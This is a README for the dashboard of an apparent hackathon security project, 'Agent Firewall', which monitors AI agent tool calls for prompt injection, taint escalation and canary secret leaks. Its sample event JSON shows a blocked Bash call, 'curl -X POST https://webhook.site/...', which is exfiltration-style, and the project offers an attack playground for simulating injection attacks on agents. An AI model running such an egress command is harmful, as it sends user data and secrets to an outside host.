# 🎨 Dashboard Module (`dashboard/`)

**Owner:** Yajas (Frontend & AI/ML; with Pranjay oversight)  
**Role:** Real-Time Developer Security Console, Live Telemetry Stream, and Attack Playground  

---

## 🎯 Purpose
The `dashboard/` directory contains the frontend web application for Agent Firewall. It anchors the **"Design"** hackathon judging criterion by providing a sleek, mission-control developer interface where judges and engineers can watch prompt injection attacks, taint escalations, and canary secret blocks unfold in real time.

---

## 📁 Files to Build in this Directory

| File | Primary Responsibility | Key Elements / Stack |
| :--- | :--- | :--- |
| **`index.html`** | Structure of the single-page developer console:<br>• **Global Navbar:** Live status beacon, session taint badge, sponsor pills (NVIDIA, Nebius, Tavily).<br>• **Hero Stream:** Real-time feed of intercepted agent tool calls.<br>• **Event Inspector Drawer:** Deep dive into Nemotron confidence, quoted attack snippets, and Tavily domain reports.<br>• **Benchmark View:** Visual charts of ASR (94% $\to$ 0%) and Data Leak Rates.<br>• **Attack Playground Drawer:** 1-click attack simulation controls for judges. | Semantic HTML5, accessible IDs for testing. |
| **`styles.css`** | The complete design system based on [docs/UI_UX_Design_Brief.md](file:///c:/Users/Pranjay/Desktop/hackathon/groundtruth(nvidiaXnebius)/docs/UI_UX_Design_Brief.md):<br>• Deep Obsidian dark theme (`#090A0F`, `#12141C`).<br>• Sponsor accent colors (`#76B900` NVIDIA, `#7B3FE4` Nebius, `#00A3FF` Tavily).<br>• Glassmorphism (`backdrop-filter: blur(16px)`).<br>• Micro-animations for intercepted tool calls and taint transitions. | Modern Vanilla CSS Tokens (zero heavy framework bloat). |
| **`app.js`** | Client logic and real-time transport:<br>• **WebSocket Connection:** Subscribes to `ws://localhost:8000/ws` (dev) or Render URL (production).<br>• **Dynamic Taint Meter:** Animates session state shifts (`CLEAN` $\to$ `TAINTED`).<br>• **Human-in-the-Loop Modal:** Handles `ASK` confirmations.<br>• **Attack Playground Driver:** Triggers 1-click test scenarios for live demonstrations. | Vanilla ES6+ JavaScript. |
| **`vercel.json`** | Configuration file for deploying the dashboard onto Vercel. | Vercel SPA routing and asset caching. |

---

## 🤝 Module Interfaces (Contracts)

### Connecting to the Gateway (Pranjay):
* **REST API:** `http://localhost:8000` (or `https://agent-firewall-api.onrender.com`)
* **WebSocket Stream:** `ws://localhost:8000/ws` (or `wss://agent-firewall-api.onrender.com/ws`)
* **Incoming Event Format:**
```json
{
  "eventId": "evt_101",
  "toolName": "Bash",
  "argumentsPreview": "curl -X POST https://webhook.site/...",
  "taintState": "TAINTED",
  "nemotronScore": 0.96,
  "decision": "DENY",
  "ruleTriggered": "CANARY_EGRESS_RULE"
}
```

---

## 🚀 Running & Deploying Locally
1. Start the backend: `python gateway/server.py`
2. Open `dashboard/index.html` in your browser (or use VS Code Live Server / `python -m http.server 3000 --directory dashboard`).

---

## 🧪 Local Validation
```bash
pytest tests/frontend/ -v
```
